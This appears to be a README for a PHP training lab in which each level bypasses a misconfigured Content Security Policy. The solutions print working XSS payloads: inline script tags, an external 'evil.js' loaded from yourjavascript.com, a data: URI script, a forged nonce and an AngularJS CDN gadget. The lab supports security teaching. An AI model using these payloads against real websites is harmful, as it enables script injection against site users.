# CSP Bypass Lab
Bypass project of CSP security standard, which is a protection method for XSS vulnerability. 
This project contains sample test cases for bypassing incorrectly&incompletely configured CSP headers. 

## What is CSP
Content Security Policy is a computer security standard that was introduced to prevent cross-site scripting, click-through, and other code injection attacks resulting from the execution of malicious content in the context of a trusted web page. 

This project created with PHP. For the run: https://www.geeksforgeeks.org/how-to-run-php-programs/#:~:text=If%20you%20want%20to%20run,Your%20program%20will%20run.

## Challenges
- unsafe-inline
- External Resource
- data directive
- src nonce
- Common uses JS CDN
- Google Callback Functions

## Solutions
Check https://csp-evaluator.withgoogle.com before solutions.

#### Level 1
As a result of the 'unsafe-inline' directive used, if the input entered contains a script tag, the javascript is triggered. Example payload 

```sh
<script>alert(1)</script>
```

#### Level 2
JS codes from yourjavascript.com, which is an external resource, will be allowed. It is triggered by malicious JS code. Go to yourjavascript.com , create malicious code and upload.

```sh
<script type="text/javascript" src="http://yourjavascript.com/0513280132/evil.js"></script>
```

#### Level 3
data: URI in script-src allows the execution of unsafe scripts.

```sh
<script src=data:text/javascript,alert(1337)></script>
```

### Level 4
We see the base64 encode form of current time's as the nonce value in response as the CSP rule. Example payload

```sh
<script nonce="MjcuMDMuMjAyMS8yMjoxNw==">alert(1)</script>
```

### Level 5
One of the most used JavaScript CDNs is cdnjs.cloudflare.com. At this level, we will try to trigger XSS on a page that has Cloudflare allowed CDN resources.

```sh
<Script Src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js> </Script><K Ng-App>{{$new.constructor('alert(1)')()}}
```

### Level 6
Same as the previous level, here you can use callback functions.

### Level 7
Given this CSP header:
Content-Security-Policy: frame-src https://example.com
The following <iframe> is blocked and won't load:
  
```sh
<iframe src="https://not-example.com/"></iframe>
```

Call the allowed page in Frame.

##### Useful Resources
- https://brutelogic.com.br/blog/csp-bypass-guidelines/
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
